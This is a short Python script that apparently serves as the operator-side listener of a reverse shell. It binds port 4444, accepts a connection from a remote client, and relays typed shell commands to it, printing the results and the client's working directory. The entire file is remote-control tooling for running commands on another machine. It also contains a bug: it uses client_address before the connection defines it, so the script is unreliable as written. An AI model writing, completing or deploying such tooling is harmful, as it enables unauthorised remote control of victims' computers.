import socket
from colorama import init
from colorama import Fore, Back , Style
init()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()
# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
a= Fore.WHITE + f"Listening as {SERVER_HOST}:{SERVER_PORT} ..."
b= f"{client_address[0]}:{client_address[1]} Connected!"
print(Fore.CYAN + "[+] " + a)
# accept any connections attempted
client_socket, client_address = s.accept()
print(Fore.GREEN + "[+] " + b)
# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
